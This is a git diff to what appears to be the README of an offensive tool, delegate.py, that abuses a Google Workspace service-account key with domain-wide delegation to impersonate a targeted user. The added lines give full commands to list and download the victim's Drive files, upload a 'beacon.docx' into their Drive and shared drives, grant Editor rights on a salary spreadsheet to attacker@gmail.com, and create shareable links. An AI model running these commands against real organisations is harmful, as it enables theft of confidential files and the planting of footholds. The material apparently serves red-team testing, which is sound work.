@@ -39,9 +39,35 @@ python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -
 
 List all files and folders within the targeted Drive account
 ```
-
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a list
 ```
 
-Download locally files/folders
-- Upload files/folders
-- Modify permissions on file/folder
+Download locally folder Restricted_documents using recursive option (-x)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a download -f Restricted_documents -x
+```
+
+Download locally a specific file secret.txt
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a download -t secret.txt
+```
+
+Upload files at user's Drive root folder (My Drive)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a upload -t ./beacon.docx
+```
+
+Upload files within specific user's Drive folder or organizational Shared Drive
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a upload -f Restricted_documents -t ./beacon.docx
+```
+
+Modify permissions on specific file or folder (Add external Gmail account with Editor permissions over the file/folder)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -f Restricted_documents -t Salary2023.xlsx -e attacker@gmail.com
+```
+
+Create shared link on specific file or folder for access
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -f Restricted_documents -t Salary2023.xlsx -l
+```
